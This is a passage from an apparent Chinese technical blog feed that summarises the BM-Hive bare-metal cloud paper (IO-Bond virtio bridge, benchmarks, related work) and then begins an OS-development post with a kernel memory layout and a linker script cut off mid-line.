将是不可忽视的开销），表 2 展示了在作者的云数据中心上 5 min 内的 300000 个 VM 的统计情况</p><p><img src="https://s2.loli.net/2024/07/25/yPx3XfA87FgMTdZ.png" alt="Table 2. Number of VM exits per second per vCPU"></p><p>即便是 Guest 直接访问硬件的设备直通也会有开销，基于 IOMMU 的实现可以增加 60% 的网卡在 CPU 上使用（但吞吐量不变）</p><p>此外还有其他会增加性能开销的层面（如 vCPU 锁、TLB等），但这些在 <code>BM-Hive</code> 服务器中都没有</p><p><strong>Performance variation</strong> ：共享资源的冲突同样带来性能影响，如 I&#x2F;O 处理高峰期 host OS 可能抢占 guest VM 执行而造成性能开销与波动</p><p>图 1 展示了作者的数据中心在 24 小时内的 20000 VM 由低到高的被 hypervisor 抢占率（shared 表示未与物理核心绑定），需要注意的是这种情况下没有 VM 主动尝试占有资源（否则会更糟）</p><p><img src="https://s2.loli.net/2024/07/25/Oe3Li9aIoykAs7Z.png" alt="Figure 1. VM preemption of the 99th and 99.9th percentile. The y-axis shows the percent of the CPU time used by the hypervisor/the host OS."></p><h2 id="2-2-Security-Concerns"><a href="#2-2-Security-Concerns" class="headerlink" title="2.2 Security Concerns"></a>2.2 Security Concerns</h2><p>VM 间硬件资源共享可能导致侧信道攻击（如 Meltdown、Spectre、L1TF 等），但在 <code>bm-guest</code> 物理隔离的 <code>BM-Hive</code> 上不存在这个问题</p><p>hypervisor 漏洞是云上主要攻击面，但 <code>bm-hypervisor</code> 无需 CPU&#x2F;内存 虚拟化且不能从 guests 侧直接访问</p><blockquote><p>笔者注：这一块实际上笔者感觉不是很彳亍，因为模拟设备在 DPU 上模拟（通常由 QEMU 实现）同样会有漏洞，对于攻击者而言似乎只是攻击的位置变了</p></blockquote><h2 id="2-3-Nested-Hypervisor"><a href="#2-3-Nested-Hypervisor" class="headerlink" title="2.3 Nested Hypervisor"></a>2.3 Nested Hypervisor</h2><p>传统云用户想要再跑虚拟机只能依赖嵌套虚拟化，这增大了 hypervisor 设计复杂度与性能开销</p><h1 id="0x03-Design"><a href="#0x03-Design" class="headerlink" title="0x03. Design"></a>0x03. Design</h1><h2 id="3-1-Design-Requirements"><a href="#3-1-Design-Requirements" class="headerlink" title="3.1 Design Requirements"></a>3.1 Design Requirements</h2><p><code>BM-Hive</code> 设计要求如下：</p><ul><li><p><strong>Multi-tenancy</strong> ： <code>BM-Hive</code> 必须支持多租户共享同一物理服务器以实现细粒度 CPU 核心</p></li><li><p><strong>Security</strong> ： <code>BM-Hive</code> 必须提供基于硬件的 <code>bm-guests</code> 间强隔离</p></li><li><p><strong>Interoperability</strong> ：  <code>BM-Hive</code> 必须与现有云基础架构兼容以获取已有的可用性、依赖性、弹性，互通性（interoperability）要求 <code>bm-guest</code> 同样能运行在 VM 中，这个特性称为 <code>cold migration</code> ，其一个依赖项便是 <code>bm-guest</code> 必须能够与云存储与网络进行高性能连接（由 virtio 这样的半虚拟化支持）， <code>BM-Hive</code> 通过特制的软硬件混合 virtio 实现</p></li><li><p><strong>Performance</strong> ： <code>bm-guest</code> 应当有原生 CPU&#x2F;内存性能与近原生 IO 性能以及最小的性能波动</p></li><li><p><strong>Cost efficiency</strong> ：<code>bm-guest </code>在同配置下 开销应比 <code>vm-guest</code> 小</p></li></ul><h2 id="3-2-System-Overview"><a href="#3-2-System-Overview" class="headerlink" title="3.2 System Overview"></a>3.2 System Overview</h2><p>图 2 对比了虚拟化架构与 <code>BM-Hive</code> 的区别，主要区别是 <code>vm-guest</code> 运行在虚拟化 CPU 与内存上而 <code>bm-guest</code> 运行在物理 CPU 与内存上，<code>bm-hypervisor</code> 是类似 <code>vm-hypervisor</code> 的用户态程序，管理 <code>vm-guest</code> 生命周期、提供 virtio 设备、与云基础架构交互等，其不需要虚拟化因而代码比 <code>vm-hypervisor</code> 简单得多，<code>bm-hypervisor</code> 进程与 <code>bm-guest</code> 间一一对应且只能通过 virtio 交互</p><p><img src="https://s2.loli.net/2024/07/25/ACfzumlg1c6UDhI.png" alt="Figure 2. Architecture of BM-Hive, compared to KVM"></p><p><strong>Use scenario</strong> ：云基础架构选择一个可用的裸金属服务器并选择一个空闲计算卡启动（通过开启 PCIe power），板上固件开始执行 boot loader 并随后加载 <code>bm-guest</code> 内核，云上绝大部分 guests 无法使用本地存储，因此 bootloader 与内核通过 virtio-blk 获取，作者通过扩展 EFI 固件以实现这一点</p><h2 id="3-3-System-Architecture"><a href="#3-3-System-Architecture" class="headerlink" title="3.3 System Architecture"></a>3.3 System Architecture</h2><p>图 3 展示了 <code>BM-Hive</code> 的系统架构，每个裸金属服务器由简化的 Xeon 服务器（<code>base</code> ）与一组计算卡（由 CPU、内存、PCIe 总线、FPGA 构建的 IO-Bond 组成的 PCIe 卡）组成，在 <code>bm-guest</code> 视角由计算卡模拟的 virtio 设备是常规的 PCIe 设备，IO-Bond 作为 <code>bm-guest</code> 中的 virtio 前端与 <code>bm-hypervisor</code> 中的 virtio 后端间的桥梁，并通过内置的 DMA 引擎进行命令与数据的转发；IO-Bond 目前支持 virtio 网络与存储设备，且可以轻易扩展，此外其可以由 ASIC 芯片实现</p><p><img src="https://s2.loli.net/2024/07/25/bEaomMIZGgAkjX8.png" alt="Figure 3. System architecture of BM-Hive"></p><p>在 <code>bm-hypervisor</code> 的角度每个计算卡便是一个 PCIe 的 <code>bm-guest</code> 设备，一个 <code>base</code> 服务器可以支撑 16 张计算卡，<code>bm-hypervisor</code> 的功能主要有：1️⃣ 管理 <code>bm-guest</code> 生命周期与计算卡分配 2️⃣ 提供并维护 virtio 设备后端 3️⃣ 与现有云基础架构对接</p><h2 id="3-4-IO-Bond"><a href="#3-4-IO-Bond" class="headerlink" title="3.4 IO-Bond"></a>3.4 IO-Bond</h2><p>IO-Bond 用于充当计算卡上 virtio 设备的代理</p><p><strong>3.4.1 IO-Bond: Frontend.</strong>  IO-Bond 前端连接到计算板的 PCIe 总线，其 FPGA 模拟了 PCI 接口供 <code>bm-guest</code> 使用，并将 <code>bm-guest</code> 访问转发到后端</p><p><code>BM-Hive</code> 无法直接使用虚拟化系统的共享环缓冲区设计（IO-Bond 前后端物理内存不共享），因此由 IO-Bond 为 <code>bm-hypervisor</code> 与 <code>bm-guest</code> 提供环缓冲区，并将 <code>bm-hypervisor</code> 的环缓冲区与其他进行同步（如图 4 所示），在一个缓冲区被添加上数据后 IO-Bond 的 DMA 引擎便会拷贝到其他缓冲区</p><p><img src="https://s2.loli.net/2024/07/25/MNbjS7ifZ1ETYF3.png" alt="Figure 4. Shadow ring buffers in BM-Hive"></p><p><strong>3.4.2 IO-Bond: Backend.</strong> IO-Bond 后端将请求转发到对应云设备，其设计主要关注与云基础架构间的高性能 I&#x2F;O，在 <code>BM-Hive</code> 中所有 I&#x2F;O 请求通过 vhost-user 协议与云基础架构（修改版 DPDK vSwitch 和 SPDK 云存储，使用 poll mode driver 而非中断）交互，由此所有请求在用户空间完成处理，避免额外的内核与用户态间内存拷贝；此外 <code>BM-Hive</code> 支持 VGA 设备以连接 <code>bm-guest</code> 控制台</p><p><img src="https://s2.loli.net/2024/07/25/BR9A5OYKZgHCSUj.png" alt="Figure 5. Backend of BM-Hive"></p><p><strong>3.4.3 IO-Bond Implementation.</strong> 每个 virtio 设备的每个 virtio 队列都有一个对应的后端 shadow vring（IO-Bond 与 <code>bm-hypervisor</code> 间的共享缓冲区，所有 shadow vring 被组织为一个缓冲区描述符列表并映射到 IO-Bond 中）， <code>bm-hypervisor</code> 与 IO-Bond 间通过一对 mailbox 寄存器传递 PCI 访问提醒，且每个 shadow vring 都有一对 head&#x2F;tail 寄存器</p><p>图 6 展示了 IO-Bond 如何响应 guests 的一个传统的 virtio Tx&#x2F;Rx 工作流，<code>bm-guest</code> 写入 virtio 寄存器以通知 IO-Bond 、并在 Rx 数据到达时获得 MSI 中断；<code>bm-hypervisor</code> 中有一个专有线程拉取 IO mailbox 与 shadow vring head&#x2F;tail 寄存器以避免中断，图中 1 ～ 6 为标准 virtio 操作；最终 IO-Bond 通过更新 head 寄存器通知 <code>bm-hypervisor</code> ，收到的 Rx 缓冲区被保留</p><p><img src="https://s2.loli.net/2024/07/25/QYZm57sTAGkjb1x.png" alt="Figure 6. Tx/Rx example of IO-Bond"></p><p>得益于 IO-Bond 中 FPGA 的低开销，<code>bm-guest</code> 到 IO-Bond 的 PCI 读写操作仅需要 0.8 µs，IO-Bond 到 mailbox 寄存器又要 0.8 µs，单次访问总开销仅 1.6 µs；IO-Bond 为每个 virtio 网络&#x2F;存储设备暴露一个 PCIe x4 接口，通过 PCIe x8 接口备份到 <code>bm-hypervisor</code> ，IO-Bond 内部 DMA 吞吐量为 50Gbps（每个 x4 接口为 32 Gbps），通过服务器共享网络接口（100 Gbps） 转发到云服务，且 <code>bm-guest</code> 间贷款消耗会动态平衡以保持公平</p><h2 id="3-5-Costs-efficiency"><a href="#3-5-Costs-efficiency" class="headerlink" title="3.5 Costs efficiency"></a>3.5 Costs efficiency</h2><p>数据中心的盈利能力取决于 vCPU 密度，传统的基于 VM 的服务器需要为 hypervisor 与 host OS 保留 CPU 核心，而 <code>BM-Hive</code> 具有更高的 vCPU 成本效益（虽然需要额外的 CPU 与 FPGA 支出）</p><p>能耗也是成本效率的一个点，但 <code>BM-Hive</code> 与传统 VM 服务器提供的 vCPU 不同，因此很难比较</p><h1 id="0x04-Evaluation"><a href="#0x04-Evaluation" class="headerlink" title="0x04. Evaluation"></a>0x04. Evaluation</h1><h2 id="4-1-Environment-Setup"><a href="#4-1-Environment-Setup" class="headerlink" title="4.1 Environment Setup"></a>4.1 Environment Setup</h2><p>表 3 展示了作者部署 <code>BM-Hive</code> 的公有云上的实例配置，注意一个云实例的 I&#x2F;O 性能通常被限速以预防资源误用和提升整体服务质量</p><p><img src="https://s2.loli.net/2024/07/26/kXH73A6xrRhWcwI.png" alt="Table 3. Bare-metal instances available in our cloud. The last column shows the maximum number of the compute boards in a single BM-Hive server. This number depends on the server’s power supply, internal space, and I/O performance."></p><h2 id="4-2-CPU-and-Memory-Performance"><a href="#4-2-CPU-and-Memory-Performance" class="headerlink" title="4.2 CPU and Memory Performance"></a>4.2 CPU and Memory Performance</h2><p>所有实验在带有相同的基于 CentOS 的系统的 Xeon E5-2682 v4 实例上完成，作者对比了 <code>BM-Hive</code> 与 VM 以及物理机（可行时）的性能，<code>vm-guest</code> 与 <code>bm-guest</code> 都运行在 64G 内存的 Xeon E5-2682 v4 CPU 上，<code>vm-guest</code> 独占实例且固定到有 NMUA 节点亲和力的物理 CPU 核心上</p><p>作者将 <code>BM-Hive</code> 与 <code>vm-guest</code> 与物理机器的性能进行比较，内核版本为 <code>3.10.0-514.26.2.el7</code> ，但物理机有 2 个 CPU 插槽与 384G 内存，图 7 与 8 展示了 SPEC CINT 2006 与 STREAM 的多次测试结果</p><p><img src="https://s2.loli.net/2024/07/26/zp1CjeF8Tn2BvNK.png" alt="Figure 7. CPU performance by SPEC CPU2006 Figure 8. Memory bandwidth by STREAM multi-thread"></p><p>CPU 的测试结果相近，<code>BM-Hive</code> 比物理机快 4%，VM 比物理机慢 4% ，注意到 <code>bm-guest</code> 与物理机性能并不完全相同（因为配置与设计不同）， <code>vm-guest</code> 则因为虚拟化的缘故存在开销</p><p><code>BM-HIve</code> 在内存上同样占优，如图 8 所示<code>BM-HIve</code> 几乎与物理机完全相同，但 <code>vm-guest</code> 由于虚拟化开销最多只有 <code>bm-guest</code> 98% 的性能</p><p><strong>Summary</strong> ：同配置 <code>bm-guest</code>比  <code>vm-guest</code> 有更好的 CPU 与内存性能，且 <code>BM-HIve</code> 可以利用单线程性能更高的 CPU</p><h2 id="4-3-I-O-Performance"><a href="#4-3-I-O-Performance" class="headerlink" title="4.3 I&#x2F;O Performance"></a>4.3 I&#x2F;O Performance</h2><p><code>bm-guest</code> 与 <code>vm-guest</code> 有着近乎一样的基于 virtio 的 IO 路径，但 <code>BM-Hive</code> 有着软硬件结合的设计，本节我们对比同一云网络与存储下的性能，guests 网速被限制在 4M PPS 与 10Gbps 的带宽，存储被限制在 25 IOPS 与 300 MBps 的带宽</p><p><strong>Network performance</strong> ：作者使用 <code>netperf-2.5</code> 在两个 <code>bm-guest</code> 间收发 UDP 包（并添加 <code>vm-guest</code> 对照组），结果如图 9 所示， <code>bm-guest</code> 与 <code>vm-guest</code> 都达到了 3.2M PPS，由于 <code>BM-Hive</code> 的 I&#x2F;O 路径更长所以 <code>vm-guest</code> 有着更少的抖动</p><p><img src="https://s2.loli.net/2024/07/26/J9iERPS8zLXpCdU.png" alt="Figure 9. UDP packet receive rate"></p><p>作者使用不同的工具对比了 <code>bm-guest</code> 与 <code>vm-guest</code> 的延迟以测算 IO-Bond 开销，图 10 显示了使用 <code>sockperf-3.5</code> 测试 UDP 的结果（并使用 DPDK 绕过内核），由于 <code>BM-Hive</code> 的 I&#x2F;O 路径更长所以 <code>vm-guest</code> 结果更好（在 ICMP 上也是）</p><p><img src="https://s2.loli.net/2024/07/26/7TVJfov5DQeHd8n.png" alt="Figure 10. UDP and ping latency"></p><p>吞吐量也是网络性能的重点，作者使用 <code>netperf-2.5</code> 测试 64  个单个数据包为 1400B 的 TCP 连接，<code>bm-guest</code> 为 9.6 Gbps， <code>vm-guest</code> 为 9.59 Gbps</p><p>总之，<code>BM-Hive</code> 性能满足设计目的，此外作者通过取消 PPS 限制来测量其最大网络性能（可以达到 16M PPS）</p><p><strong>Storage performance</strong> ：作者通过100Gbps 网络访问 SSD 云存储运行 fio benchmark 使用 8 线程进行 4KB 随机读写， <code>bm-guest</code> 与 <code>vm-guest</code> 都是饱和存储速率，但如图 11 所示 <code>bm-guest</code> 有更低的平均延迟与 99.9% 延迟</p><p><img src="https://s2.loli.net/2024/07/26/BKcsrvJhi26TnO8.png" alt="Figure 11. Storage I/O latency"></p><p>作者还测试了无限制的访问本地 SSD 的存储性能， <code>BM-Hive</code> 在 IOPS 上比 VM 快 50%，在带宽上快 100%，平均延迟仅为 60µs</p><p>总之，<code>BM-Hive</code> 的存储性能得益于 IO-Bond 的 DMA 引擎而比需要额外内存拷贝的 VM 更好</p><p><strong>Summary</strong> ：<code>bm-guest</code> 与 <code>vm-guest</code> 都能达到基于云的网络与存储 IO 限制，但 <code>bm-guest</code> 在更坏情况（99.9 percentile）下更好，在无限制下比 <code>vm-guest</code> 性能显著提高</p><h2 id="4-4-Application-Performance"><a href="#4-4-Application-Performance" class="headerlink" title="4.4 Application Performance"></a>4.4 Application Performance</h2><p>一个重要的实验是 <code>BM-Hive</code> 执行云上常用应用的性能，测试结果如图 12、13、14 所示</p><blockquote><p>详细的实验数据就不抄了，自己去看原文（笑）</p></blockquote><p><img src="https://s2.loli.net/2024/07/26/T4Pt6phkYzZOb2x.png" alt="Figure 12. NGINX Figure 13. MariaDB ready-only Figure 14. MariaDB rd/wr and wr-only Figure 15. Redis with varying clients Figure 16. Redis with varying data size"></p><p><strong>Summary</strong> ： <code>BM-Hive</code> 运行流行云上应用的性能比基于虚拟化的云服务更好</p><h1 id="0x05-Related-Work"><a href="#0x05-Related-Work" class="headerlink" title="0x05. Related Work"></a>0x05. Related Work</h1><p><strong>Reducing world switches</strong> ：虚拟化的主要开销之一便是 guest 与 hypervisor 间的切换，有一部分工作便关注于减少切换，例如形如网卡的高速驱动会产生大量中断，<a href="https://dl.acm.org/doi/pdf/10.1145/2248487.2151020">ELI</a> （Exit-Less Interrupt）致力于将 hypervisor 从中断路径上移除从而让 Guest 直接处理中断以提高吞吐量并减少延迟；此外在 guest 侧也有优化空间，如 KVM 最近引入的 <code>halt_polling</code> 特性在让 CPU 休眠前拉取唤醒请求以避免 guest 在休眠后又立即被等待中的唤醒请求唤醒；但 <code>BM-Hive</code> 不会有这些问题</p><p><strong>Memory virtualization</strong> ：内存通常被虚拟化为两级页表：GVA➡️GPA➡️HPA，因此现有工作之一便是减少开销极大的 TLB miss ，如增大 TLB 覆盖率（例如使用大页）或减少 TLB 惩罚，如 <a href="https://dl.acm.org/doi/10.1145/3140659.3080210">POM-TLB</a> 便是将内存的一部分作为 TLB 以增大 TLB，或是<a href="https://www.usenix.org/conference/atc17/technical-sessions/presentation/amit">跟踪页访问以维护 TLB 而减少 TLB miss</a>；但 <code>BM-Hive</code> 不会有这些问题</p><p><strong>Device virtualization</strong> ：现有虚拟设备大都通过半虚拟化实现，最流行的便是 virtio ，此外如 SR-IOV 网卡等也支持原生虚拟化；特别地，<code>BM-Hive</code> 通过混合方式实现了 virtio 以与现有云基础架构交互</p><p><strong>Minimal hypervisor</strong> ：也有一些工作关注于创建最小的 hypervisor ，如 Intel 的 ACRN 便是用于嵌入式 IOT 设备的小型 hypervisor （ <del>笔者注：嵌入式设备还要跑 VM？</del> ）；<code>BM-Hive</code> 比传统的 hypervisor 都简单，因为其并不虚拟化任何东西，也不直接与 <code>bm-guest</code> 交互</p><p><strong>Nest hypervisor</strong> ：<code>BM-Hive</code> 目标之一便是让用户能运行自己的虚拟机，在传统架构上嵌套虚拟化可以实现但开销较大，<code>BM-Hive</code> 的用户直接运行在物理 CPU 上因而有着完全的硬件虚拟化支持</p><p><strong>Other bare-metal services</strong> ：绝大部分公有云都部署了单租户裸金属服务，限制如第 1 节所示；部分公有云也为 VM 部署了特殊的网络设备，例如 Azure 也有智能网卡，但据作者所知其更关注底层云基础架构的优化，而 <code>BM-Hive</code> 并不接触云基础架构层</p><p>也有部分系统有着相似的整体架构，如 Intel 的 VCA2 便是一个带有三个 Xeon E3 v1258L 处理器的 PCIe 卡，但 <code>BM-Hive</code>  是为了云服务而生的</p><h1 id="0x06-Discussion"><a href="#0x06-Discussion" class="headerlink" title="0x06. Discussion"></a>0x06. Discussion</h1><p>本节讨论 <code>BM-Hive</code> 的潜在提升与未来研究计划</p><p><strong>Improvements to IO-Bond</strong> ： IO-Bond 的设计可以进行优化（例如将包处理从 <code>bm-hypervisor</code> 卸载到 IO-Bond 上），除了使用 FPGA 以外也可以使用 ASIC 实现</p><p><strong>Live Migration and Upgrade</strong> ：虚拟机动态迁移非常重要，<a href="https://dl.acm.org/doi/10.1145/3297858.3304034">Orthus</a> 被用于在不停止虚拟机的情况下动态升级 VMM，<code>BM-Hive</code> 的设计使其可以直接应用 Orthus 的方案升级 VMM，但 <code>bm-guest</code> 的迁移则更有挑战，目前的方案是插入一个虚拟化曾并将其转换为 <code>vm-guest</code> ，但仍存在优化空间</p><p><strong>SGX Support</strong> ：SGX 是一个可信执行环境，但目前的虚拟机不好使用这个东西，作者计划在未来为 <code>BM-Hive</code> 添加原生 SGX 支持</p><h1 id="0x07-Summary"><a href="#0x07-Summary" class="headerlink" title="0x07. Summary"></a>0x07. Summary</h1><p>作者设计了 <code>BM-Hive</code> 并进行了评估，很好很强大🎇🎆🎇</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;出走字节 IaaS 开发实习两年，归来读安全 PhD 依然在做 DPU&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="系统虚拟化" scheme="https://arttnba3.github.io/tags/%E7%B3%BB%E7%BB%9F%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="云计算" scheme="https://arttnba3.github.io/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
    <category term="DPU" scheme="https://arttnba3.github.io/tags/DPU/"/>
    
    <category term="裸金属" scheme="https://arttnba3.github.io/tags/%E8%A3%B8%E9%87%91%E5%B1%9E/"/>
    
  </entry>
  
  <entry>
    <title>【CODE.0x04】现代 64 位 OS 开发手记 II：内核内存分配器与 C++ 的初步引入</title>
    <link href="https://arttnba3.github.io/2024/06/30/CODE-0X04-OSDEV64-II_MEMORY-MANAGE/"/>
    <id>https://arttnba3.github.io/2024/06/30/CODE-0X04-OSDEV64-II_MEMORY-MANAGE/</id>
    <published>2024-06-30T13:39:41.000Z</published>
    <updated>2024-10-11T02:54:24.669Z</updated>
    
    <content type="html"><![CDATA[<p>Good old MEMORIES has gone…</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>不知不觉这个系列的文章居然已经鸽了大半年了…虽然说已经拖了这么久没有继续进行下一步的代码编写，不过笔者目前暂时并没有放弃这个项目，只是确实不像本科那样能有大段大段的空闲时间去抛开一切去做自己想做的事情了：）</p><p>言归正传，这一次我们将要脱离引导阶段，进入到位于高地址的真正的内核，并建立内存管理系统，笔者选择优先实现内存管理的原因是因为这是一个非常核心的模块，操作系统内核的各个部分几乎都无时无刻不在进行动态内存分配与释放，因此完成了这个模块的开发之后我们后续的工作也能变得更加方便</p><p>本项目代码开源在 <a href="https://github.com/arttnba3/ClosureOS">https://github.com/arttnba3/ClosureOS</a></p><blockquote><p>注： <strong>本章暂时省略了常规的内核输出语句</strong> （如类似 <code>printk()</code> 的东西），我们将在下一章完成图形与串口驱动初始化后再重新引入这部分功能，如若你需要查看调试信息，则可以 <em>临时重新引入</em> boot 阶段的输出模块</p></blockquote><blockquote><p>注2：本章额外引入了部分辅助用的基础内核数据结构（例如双向链表），由于其实现简单且并非讲述重点，因此本文 <strong>不会详细叙述所有额外添加了的东西</strong> ，而是仅关注于 <code>内存分配</code> 这一主线，对于此类基础数据结构的实现方式感兴趣的同学可以自行查看源码：）</p></blockquote><h2 id="内核内存布局设定与链接脚本调整"><a href="#内核内存布局设定与链接脚本调整" class="headerlink" title="内核内存布局设定与链接脚本调整"></a>内核内存布局设定与链接脚本调整</h2><p>目前我们暂定的内核内存布局如下所示，笔者在设计时尽量使各个区域都对齐到一个四级页表条目 （512 GB），从而使得我们在后续创建进程时无需重复拷贝过多的内核页表项，而可以尽量进行复用：</p><table><thead><tr><th align="center">Start address</th><th align="center">End address</th><th align="center">Size</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">0x0000000000000000</td><td align="center">0x00007FFFFFFFFFFF</td><td align="center">128TB</td><td align="center">memory space for user-mode process, isolate for per one</td></tr><tr><td align="center">0x0000800000000000</td><td align="center">0xFFFF7FFFFFFFFFFF</td><td align="center">16776960 TB</td><td align="center">unused hole</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">shared kernel-space virtual memory for all processes</td></tr><tr><td align="center">0xFFFF800000000000</td><td align="center">0xFFFFBFFFFFFFFFFF</td><td align="center">64TB</td><td align="center">direct mapping of first 64TB physical memory (physmem_base)</td></tr><tr><td align="center">0xFFFFC00000000000</td><td align="center">0xFFFFCFFFFFFFFFFF</td><td align="center">16TB</td><td align="center">dynamic kernel memory mapping region (vmremap_base)</td></tr><tr><td align="center">0xFFFFD00000000000</td><td align="center">0xFFFFEFFFFFFFFFFF</td><td align="center">32TB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFF00000000000</td><td align="center">0xFFFFF7FFFFFFFFFF</td><td align="center">8TB</td><td align="center">page database (pgdb_base)</td></tr><tr><td align="center">0xFFFFF80000000000</td><td align="center">0xFFFFF9FFFFFFFFFF</td><td align="center">2TB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFFA0000000000</td><td align="center">0xFFFFFA0FFFFFFFFF</td><td align="center">64GB</td><td align="center">kernel stack, isolate for each process</td></tr><tr><td align="center">0xFFFFFA1000000000</td><td align="center">0xFFFFFF7FFFFFFFFF</td><td align="center">5568GB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFFF8000000000</td><td align="center">0xFFFFFF800FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .text segment</td></tr><tr><td align="center">0xFFFFFF8010000000</td><td align="center">0xFFFFFF801FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .data segment</td></tr><tr><td align="center">0xFFFFFF8020000000</td><td align="center">0xFFFFFF802FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .rodata segment</td></tr><tr><td align="center">0xFFFFFF8030000000</td><td align="center">0xFFFFFF803FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .bss segment</td></tr><tr><td align="center">0xFFFFFF8050000000</td><td align="center">0xFFFFFFFFFFFFFFFF</td><td align="center">511GB</td><td align="center">unused hole</td></tr></tbody></table><p>相应地，我们需要略微调整一下原有的链接脚本中的内核部分，在第一章时笔者仅是简单地将其放置在高内存区域，现在我们根据如上所示内存布局进行调整，这里注意计算各个段的物理位置：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs stata">OUTPUT_FORMAT(<span class="hljs-string">&quot;elf64-x86-64&quot;</span>)<br>OUTPUT_ARCH(i386:x86-64)<br>ENTRY(_start)<br><br>SECTIONS<br>&#123;<br>    <span class="hljs-comment">/* boot loader will load the kernel there */</span><br>    . = 1M;<br>__boot_start = .;<br><br><span class="hljs-comment">/* ASM boot-state kernel */</span><br><br>    .<span class="hljs-keyword">boot</span>.loader :<br>&#123;<br><span class="hljs-keyword">KEEP</span>(*(.<span class="hljs-keyword">boot</span>.header))<br><span class="hljs-comment">*(.boot.*)</span><br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a<br>&#125;<br><br>. = ALIGN(4096);<br><br><span class="hljs-comment">/* C boot-state kernel */</span><br><br>.<span class="hljs-keyword">boot</span>.text ALIGN(4096) :<br>&#123;<br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a(.text)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.<span class="hljs-keyword">boot</span>.rodata ALIGN(4096) :<br>&#123;<br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a(.rodata)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.<span class="hljs-keyword">boot</span>.data ALIGN(4096) :<br>&#123;<br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a(.data)<br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a(.*)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__boot_end = .;<br><br><span class="hljs-comment">/* now we come to the REAL kernel */</span><br><br>KERN_ELF_BASE = 0xFFFFFF8000000000;<br>. = KERN_ELF_BASE;<br>__kernel_start = .;<br><br><span class="hljs-comment">/* we use AT() there to make it loaded on phys correctly */</span><br><br>KERN_TEXT_BASE = KERN_ELF_BASE;<br>. = KERN_TEXT_BASE;<br>__kernel_text_base = .;<br><br>.text ALIGN(4096) : AT (__kernel_text_base - __kernel_start + __boot_end)<br>&#123;<br><span class="hljs-comment">*(.text)</span><br><span class="hljs-comment">*(.text.*)</span><br><span 